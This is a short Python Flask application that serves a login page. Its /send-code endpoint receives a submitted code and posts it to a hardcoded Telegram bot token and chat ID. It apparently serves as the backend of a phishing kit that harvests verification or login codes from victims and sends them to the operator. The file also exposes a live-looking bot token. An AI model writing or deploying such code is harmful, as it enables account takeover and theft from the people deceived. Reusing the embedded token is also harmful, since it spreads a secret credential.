from flask import Flask, request, jsonify, render_template
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
TELEGRAM_CHAT_ID = '6297861735'

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.get_json()
    print("Reçu :", data)  # Debug utile

    code = data.get('code')
    if code:
        message = f"Code reçu : {code}"
        resp = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={'chat_id': TELEGRAM_CHAT_ID, 'text': message}
        )
        print("Telegram:", resp.text)
        return jsonify({'status': 'success'}), 200
    else:
        return jsonify({'status': 'no code'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=True)
